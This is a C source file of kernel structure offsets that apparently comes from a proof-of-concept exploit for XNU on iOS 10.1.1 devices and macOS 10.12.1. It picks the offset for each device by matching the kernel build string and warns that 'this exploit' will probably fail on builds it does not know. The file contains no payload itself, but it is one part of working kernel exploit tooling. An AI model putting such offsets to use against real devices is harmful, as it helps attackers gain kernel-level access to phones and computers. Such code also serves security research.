#include <stdio.h>
#include <stdlib.h>
#include <strings.h>

#include "memctl/platform.h"

#include "offsets.h"

// offsets in struct ipc_space
uint64_t struct_ipc_space_is_table_offset;


void init_ipad_mini_2_10_1_1_14b100() {
  printf("setting offsets for iPad mini 2 10.1.1\n");

  struct_ipc_space_is_table_offset = 0x20;
}

void init_ipod_touch_6g_10_1_1_14b100() {
  printf("setting offsets for iPod touch 6G 10.1.1\n");

  struct_ipc_space_is_table_offset = 0x20;
}

void init_macos_10_12_1() {
  printf("setting offsets for MacOS 10.12.1\n");

  struct_ipc_space_is_table_offset = 0x18;
}

void init_iphone_6s_10_1_1_14b100() {
  printf("setting offsets for iPhone 6s 10.1.1\n");

  struct_ipc_space_is_table_offset = 0x20;
}

void init_iphone_7_10_1_1_14b100() {
  printf("setting offsets for iPhone 7 10.1.1\n");

  struct_ipc_space_is_table_offset = 0x20;
}

void unknown_build() {
  printf("This is an unknown kernel build - the offsets are likely to be incorrect and it's very unlikely this exploit will work\n");
}

void init_offsets() {
  printf("release: %u.%u.%u\n", platform.release.major, platform.release.minor, platform.release.patch);
  printf("version: %s\n", platform.version);
  printf("machine: %s\n", platform.machine);

  if (strstr(platform.machine, "iPod7,1")) {
    // this is an iPod 6G
    if (strstr(platform.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7000")) {
      printf("this is a known kernel build for iPod touch 6G - offsets should be okay\n");
    } else {
      unknown_build();
    }
    init_ipod_touch_6g_10_1_1_14b100();
    return;
  }
  if (strstr(platform.machine, "iPad4,4")) {
    // this is an iPad mini 2
    if (strstr(platform.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")){
      printf("this is a known kernel build for iPad mini 2 - offsets should be okay\n");
    } else {
      unknown_build();
    }
    init_ipad_mini_2_10_1_1_14b100();
    return;
  }
  if (strstr(platform.machine, "iPhone8,1")) {
    // this is an iPhone 6s
    if (strstr(platform.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S8000")) {
        printf("this is a known kernel build for iPhone 6s - offsets should be okay\n");
    } else {
        unknown_build();
    }
    init_iphone_6s_10_1_1_14b100();
    return;
  }
  if (strstr(platform.machine, "iPhone9,1")) {
    // this is an iPhone 7
    if (strstr(platform.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T8010")) {
        printf("this is a known kernel build for iPhone 7 - offsets should be okay\n");
    } else {
        unknown_build();
    }
    init_iphone_7_10_1_1_14b100();
    return;
  }

  printf("don't recognize this platform\n");
  unknown_build();
  exit(1);
}
